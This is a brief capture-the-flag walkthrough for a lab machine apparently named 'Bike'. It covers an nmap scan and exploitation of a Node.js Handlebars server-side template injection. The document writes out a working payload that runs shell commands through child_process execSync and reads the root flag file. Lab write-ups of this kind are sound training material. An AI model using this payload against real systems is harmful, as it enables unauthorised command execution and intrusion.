![Bike.png](/assets/Tier-1/Bike/Bike.jpeg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 1 10.129.97.64
```



2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.97.64
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Visit web page

![web.PNG](/assets/Tier-1/Bike/web.PNG)

4. Execute a SSTI exploit

![submit.PNG](/assets/Tier-1/Bike/submit.PNG)


**Output**

![ssti.PNG](/assets/Tier-1/Bike/ssti.PNG)

5. Use https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify to get code for execute commands.

![nodejs.PNG](/assets/Tier-1/Bike/nodejs.PNG)

6. After execute the command you add this line:

`{{this.push "return process.mainModule.require('child_process').execSync('<command>')"}}`

7. Use BurpSuite to do this.

* Go to **Decoder** and paste all code 

![encoder.PNG](/assets/Tier-1/Bike/encoder.PNG)

* Encode in **URL**
---

Paste code encoded in petition

![petition.PNG](/assets/Tier-1/Bike/petition.PNG)

**Output**

![output.PNG](/assets/Tier-1/Bike/output.PNG)


8. Read **flag**

```js
{{this.push "return process.mainModule.require('child_process').execSync('cat  /root/flag.txt')"}}
```

**Output**

![flag.PNG](/assets/Tier-1/Bike/flag.PNG)



